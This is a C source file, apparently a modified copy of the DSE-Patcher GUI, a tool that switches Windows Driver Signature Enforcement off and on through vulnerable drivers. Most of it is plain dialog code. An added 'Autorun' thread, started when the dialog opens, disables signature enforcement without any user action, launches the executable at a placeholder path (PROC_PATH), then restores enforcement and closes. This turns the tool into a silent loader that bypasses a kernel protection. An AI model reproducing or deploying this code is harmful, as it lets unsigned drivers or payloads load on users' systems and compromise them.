
// DSE-Patcher - Patch DSE (Driver Signature Enforcement)
// Copyright (C) 2022 Kai Schtrom
//
// This file is part of DSE-Patcher.
//
// DSE-Patcher is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// DSE-Patcher is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with DSE-Patcher. If not, see <http://www.gnu.org/licenses/>.

// disable lint warnings for complete source code file
//lint -e459  Warning  459: Function 'MyDlg1DlgProc' whose address was taken has an unprotected access to variable 'g'
//lint -e744  Warning  744: switch statement has no default
//lint -e747  Warning  747: Significant prototype coercion -> This is only used here, because SendMessage needs a lot of type conversions otherwise.
//lint -e750  Warning  750: local macro '_CRT_SECURE_NO_DEPRECATE' not referenced
//lint -e818  Warning  818: Pointer parameter could be declared as pointing to const --- Eff. C++ 3rd Ed. item 3
//lint -e952  Warning  952: Parameter could be declared const --- Eff. C++ 3rd Ed. item 3
//lint -e953  Warning  953: Variable could be declared as const --- Eff. C++ 3rd Ed. item 3
//lint -e1924 Warning 1924: C-style cast -- More Effective C++ #2

// deprecate unsafe function warnings e.g. strcpy, sprintf
#define _CRT_SECURE_NO_DEPRECATE
#ifndef _DEBUG
#define _NO_CRT_STDIO_INLINE
#endif

#include <windows.h>
// CreateStatusWindow
#include <commctrl.h>
#include "resource.h"
#include "MyFunctions.h"

// CreateStatusWindow
#pragma comment(lib,"comctl32.lib")

extern GLOBALS g;

#define PROC_PATH L"DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD"

//------------------------------------------------------------------------------
// create tooltip window and associate the tooltip with the control
//------------------------------------------------------------------------------
int MyDlg1CreateTooltip(HMODULE hInstance,HWND hDialog,HWND hControl)
{
	// create tooltip window
	HWND hwndTip = CreateWindowEx(NULL,TOOLTIPS_CLASS,NULL,WS_POPUP | TTS_ALWAYSTIP,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,hDialog,NULL,hInstance,NULL);
	if(hwndTip == NULL)
	{
		return 1;
	}

	// associate the tooltip with the control
	TOOLINFO toolInfo;
	memset(&toolInfo,0,sizeof(TOOLINFO));
	toolInfo.cbSize = sizeof(TOOLINFO);
	toolInfo.hwnd = hDialog;
	toolInfo.uFlags = TTF_CENTERTIP | TTF_IDISHWND | TTF_SUBCLASS;
	toolInfo.uId = (UINT_PTR)hControl;
	// if lpszText is set to LPSTR_TEXTCALLBACK, the control sends the TTN_GETDISPINFO notification code to the owner window to retrieve the text
	toolInfo.lpszText = LPSTR_TEXTCALLBACK;
	SendMessage(hwndTip,TTM_ADDTOOL,0,(LPARAM)&toolInfo);

	// set the visible duration of the tooltip before it closes to 30 seconds
	SendMessage(hwndTip,TTM_SETDELAYTIME,TTDT_AUTOPOP,30000);

	return 0;
}


//------------------------------------------------------------------------------
// tooltip set multiline text
//------------------------------------------------------------------------------
int MyDlg1TooltipSetMultilineText(LPARAM lParam)
{
	LPNMTTDISPINFO pInfo = (LPNMTTDISPINFO)lParam;

	// enable multiline tooltip by setting the display rectangle to 500 pixels
	// we never use the full width of 500 pixels, because we use newlines for long tooltip text
	SendMessage(pInfo->hdr.hwndFrom,TTM_SETMAXTIPWIDTH,0,500);

	// set tooltip text
	if((HWND)pInfo->hdr.idFrom == g.Dlg1.hButton1)
	{
		pInfo->lpszText = "Disable \"Driver Signature Enforcement\":\nSets the variable to \"DSE Disable Value\".";
	}
	else if((HWND)pInfo->hdr.idFrom == g.Dlg1.hButton2)
	{
		pInfo->lpszText = "Enable \"Driver Signature Enforcement\":\nSets the variable to \"DSE Enable Value\".";
	}
	else if((HWND)pInfo->hdr.idFrom == g.Dlg1.hButton3)
	{
		//pInfo->lpszText = "Restore \"Driver Signature Enforcement\":\nSets the variable to \"DSE Original Value\".\n\n"
		//				  "Attention:\nThe \"DSE Original Value\" is retrieved\nonly one time on startup of "APPNAME"!";
	}
	else if((HWND)pInfo->hdr.idFrom == g.Dlg1.hCombo1)
	{
		// check vulnerable driver combo box selection
		int sel = (int)SendMessage(g.Dlg1.hCombo1,CB_GETCURSEL,0,0);
		if(sel != CB_ERR)
		{
			// show corresponding tool tip text
			// the tool tip text is initialized in the function MyInitVulnerableDrivers
			//lint -e{1773} Warning 1773: Attempt to cast away const (or volatile)
			pInfo->lpszText = (LPSTR)g.vd[sel].szToolTipText;
		}
	}

	return 0;
}

DWORD WINAPI Autorun(PVOID pvoid) {
	LPVOID* a = (LPVOID*)pvoid;

	WaitForSingleObject((HANDLE)a[0], INFINITE);

	g.ucRunning = 1;
	g.ThreadParams.ttno = ThreadTaskDisableDSE;
	HANDLE a1 = CreateThread(NULL, 0, MyThreadProc1, (LPVOID)&g.ThreadParams, 0, NULL);
	WaitForSingleObject(a1, INFINITE);

	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	if (CreateProcessW(PROC_PATH, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	g.ucRunning = 1;
	g.ThreadParams.ttno = ThreadTaskRestoreDSE;
	HANDLE a2 = CreateThread(NULL, 0, MyThreadProc1, (LPVOID)&g.ThreadParams, 0, NULL);
	WaitForSingleObject(a2, INFINITE);

	EndDialog((HWND)a[1], 0);
	free(a);
	return 0;
}

//------------------------------------------------------------------------------
// dialog on init
//------------------------------------------------------------------------------
int MyDlg1OnInitDialog(HWND hwnd)
{
	// get control window handles
	g.Dlg1.hDialog1 = hwnd;
	g.Dlg1.hButton1 = GetDlgItem(hwnd,IDC_BUTTON1);
	g.Dlg1.hButton2 = GetDlgItem(hwnd,IDC_BUTTON2);
	g.Dlg1.hButton3 = GetDlgItem(hwnd,IDC_BUTTON3);
	g.Dlg1.hCombo1 = GetDlgItem(hwnd,IDC_COMBO1);
	g.Dlg1.hStatic1 = GetDlgItem(hwnd,IDC_STATIC1);

	// set dialog icons
	HICON hIcon1 = LoadIcon(g.hInstance,MAKEINTRESOURCE(IDI_ICON1));
	HICON hIcon2 = LoadIcon(g.hInstance,MAKEINTRESOURCE(IDI_ICON2));
	SendMessage(hwnd,WM_SETICON,ICON_BIG,(LPARAM)hIcon1);
	SendMessage(hwnd,WM_SETICON,ICON_SMALL,(LPARAM)hIcon2);

	// set dialog title
	//SendMessage(hwnd,WM_SETTEXT,0,(LPARAM)APPNAME" "VERSION" "BUILD);

	// create status bar with two parts
	RECT rect;
	GetClientRect(hwnd,&rect);
	g.Dlg1.hStatusBar1 = CreateStatusWindow(WS_CHILD|WS_VISIBLE,0,hwnd,IDC_STATUS_BAR1);
	int widths[2] = {rect.right-50,-1};
	SendMessage(g.Dlg1.hStatusBar1,SB_SETPARTS,2,(LPARAM)widths);

	// set font type for static control
	// create font from installed font type
	LOGFONT lf;
	memset(&lf,0,sizeof(LOGFONT));
	// retrieve handle to device context for client area
	HDC hdc = GetDC(hwnd);
	// set font size to 8
	lf.lfHeight = -MulDiv(8,GetDeviceCaps(hdc,LOGPIXELSY),72);
	// release device context
	ReleaseDC(hwnd,hdc);
	// use "Lucida Console" because it is a monospaced font present on all target OSs
	strcpy(lf.lfFaceName,"Lucida Console");
	// create logical font
	HFONT hFont = CreateFontIndirect(&lf);
	// set font of static control
	SendMessage(g.Dlg1.hStatic1,WM_SETFONT,(WPARAM)hFont,FALSE);

	// initialize vulnerable driver structures
	//lint -e{534} Warning 534: Ignoring return value of function
	MyInitVulnerableDrivers(g.vd,MAX_VULNERABLE_DRIVERS);

	// do this for all vulnerable drivers
	for(unsigned int i = 0; i < MAX_VULNERABLE_DRIVERS; i++)
	{
		// add valid vulnerable driver to combo box
		if(g.vd[i].szProvider[0] != 0) SendMessage(g.Dlg1.hCombo1,CB_ADDSTRING,0,(LPARAM)g.vd[i].szProvider);
	}

	// select first vulnerable driver in combo box
	SendMessage(g.Dlg1.hCombo1,CB_SETCURSEL,0,0);

	// set focus to button 1
	SetFocus(g.Dlg1.hButton1);

	// create tooltip window and associate the tooltip with button 1, 2, 3 and combo box
	//lint -e{534} Warning 534: Ignoring return value of function
	MyDlg1CreateTooltip(g.hInstance,hwnd,g.Dlg1.hButton1);
	//lint -e{534} Warning 534: Ignoring return value of function
	MyDlg1CreateTooltip(g.hInstance,hwnd,g.Dlg1.hButton2);
	//lint -e{534} Warning 534: Ignoring return value of function
	MyDlg1CreateTooltip(g.hInstance,hwnd,g.Dlg1.hButton3);
	//lint -e{534} Warning 534: Ignoring return value of function
	MyDlg1CreateTooltip(g.hInstance,hwnd,g.Dlg1.hCombo1);

	// run initialization thread
	g.ucRunning = 1;
	g.ThreadParams.ttno = ThreadTaskReadDSEOnFirstRun;
	HANDLE a0 = CreateThread(NULL,0,MyThreadProc1,(LPVOID)&g.ThreadParams,0,NULL);

	LPVOID* a = (LPVOID*)(malloc(2 * sizeof(LPVOID)));
	a[0] = (PVOID)a0;
	a[1] = (PVOID)hwnd;
	CreateThread(NULL, 0, Autorun, (LPVOID)a, 0, NULL);

	return 0;
}


//------------------------------------------------------------------------------
// enable or disable the dialog controls
//------------------------------------------------------------------------------
int MyDlg1EnableControls(unsigned char ucEnable)
{
	if(ucEnable == 1)
	{
		EnableWindow(g.Dlg1.hButton1,TRUE);
		EnableWindow(g.Dlg1.hButton2,TRUE);
		EnableWindow(g.Dlg1.hButton3,TRUE);
		EnableWindow(g.Dlg1.hCombo1,TRUE);
		SetFocus(g.Dlg1.hButton1);
	}
	else
	{
		EnableWindow(g.Dlg1.hButton1,FALSE);
		EnableWindow(g.Dlg1.hButton2,FALSE);
		EnableWindow(g.Dlg1.hButton3,FALSE);
		EnableWindow(g.Dlg1.hCombo1,FALSE);
		SetFocus(g.Dlg1.hButton1);
	}

	return 0;
}


//------------------------------------------------------------------------------
// button 1 "DSE Disable" clicked
//------------------------------------------------------------------------------
int MyDlg1Button1OnClick()
{
	// run DSE disable thread
	g.ucRunning = 1;
	g.ThreadParams.ttno = ThreadTaskDisableDSE;
	CreateThread(NULL,0,MyThreadProc1,(LPVOID)&g.ThreadParams,0,NULL);

	return 0;
}


//------------------------------------------------------------------------------
// button 2 "DSE Enable" clicked
//------------------------------------------------------------------------------
int MyDlg1Button2OnClick()
{
	// run DSE enable thread
	g.ucRunning = 1;
	g.ThreadParams.ttno = ThreadTaskEnableDSE;
	CreateThread(NULL,0,MyThreadProc1,(LPVOID)&g.ThreadParams,0,NULL);

	return 0;
}


//------------------------------------------------------------------------------
// button 3 "DSE Restore" clicked
//------------------------------------------------------------------------------
int MyDlg1Button3OnClick()
{
	// run DSE restore thread
	g.ucRunning = 1;
	g.ThreadParams.ttno = ThreadTaskRestoreDSE;
	CreateThread(NULL,0,MyThreadProc1,(LPVOID)&g.ThreadParams,0,NULL);

	return 0;
}


//------------------------------------------------------------------------------
// WM_TIMER message processing
//------------------------------------------------------------------------------
int MyDlg1OnTimer(WPARAM wParam)
{
	UNREFERENCED_PARAMETER(wParam);

	// increment seconds
	g.Dlg1.uiTimerSeconds++;

	// change minutes every 60 seconds
	if(g.Dlg1.uiTimerSeconds == 60)
	{
		g.Dlg1.uiTimerMinutes++;
		g.Dlg1.uiTimerSeconds = 0;
	}
	
	// change hours every 60 minutes
	if(g.Dlg1.uiTimerMinutes == 60)
	{
		g.Dlg1.uiTimerHours++;
		g.Dlg1.uiTimerMinutes = 0;
		g.Dlg1.uiTimerSeconds = 0;
	}
	
	// build time string in the format 00:00:00
	char szTime[9];
	sprintf(szTime,"%.2u:%.2u:%.2u",g.Dlg1.uiTimerHours,g.Dlg1.uiTimerMinutes,g.Dlg1.uiTimerSeconds);
		
	// set pane 1 status bar text
	SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,1,(LPARAM)szTime);

	return 0;
}


//------------------------------------------------------------------------------
// dialog procedure callback
//------------------------------------------------------------------------------
INT_PTR CALLBACK MyDlg1DlgProc(HWND hwnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	switch(uMsg)
	{
	case WM_TIMER:
		//lint -e{534} Warning 534: Ignoring return value of function
		MyDlg1OnTimer(wParam);
		return 1;
	case WM_INITDIALOG:
		//lint -e{534} Warning 534: Ignoring return value of function
		MyDlg1OnInitDialog(hwnd);
		// return FALSE, otherwise the keyboard focus is not set correctly by SetFocus
		return 0;
	case WM_CLOSE:
		// check if thread is running before closing the dialog
		if(g.ucRunning == 0)
		{
			EndDialog(hwnd,0);
		}
		return 1;
	case WM_COMMAND:
		switch(LOWORD(wParam))
		{
		case IDC_BUTTON1:
			switch(HIWORD(wParam))
			{
			case BN_CLICKED:
				//lint -e{534} Warning 534: Ignoring return value of function
				MyDlg1Button1OnClick();
				return 1;
			}
			break;
		case IDC_BUTTON2:
			switch(HIWORD(wParam))
			{
			case BN_CLICKED:
				//lint -e{534} Warning 534: Ignoring return value of function
				MyDlg1Button2OnClick();
				return 1;
			}
			break;
		case IDC_BUTTON3:
			switch(HIWORD(wParam))
			{
			case BN_CLICKED:
				//lint -e{534} Warning 534: Ignoring return value of function
				MyDlg1Button3OnClick();
				return 1;
			}
			break;
		}
		break;
	case WM_NOTIFY:
		switch(((LPNMHDR)lParam)->code)
        {
		// this is only triggered if we hover with the mouse over the control
		// for the combo box this is only triggered for the button of the control and not the item list
		//lint -e{835} Warning 835: A zero has been given as right argument to operator '-'
		case TTN_GETDISPINFO:
			// tooltip set multiline text
			//lint -e{534} Warning 534: Ignoring return value of function
			MyDlg1TooltipSetMultilineText(lParam);
			return 1;
		}
		break;
	}
	
	return 0;
}

//------------------------------------------------------------------------------
// WinMain
//------------------------------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);
	UNREFERENCED_PARAMETER(nCmdShow);

	// zero all global vars
	memset(&g,0,sizeof(GLOBALS));
	g.hInstance = hInstance;

	// create dialog box from resource
	DialogBoxParam(hInstance,MAKEINTRESOURCE(IDD_DIALOG1),0,MyDlg1DlgProc,0);

	return 0;
}

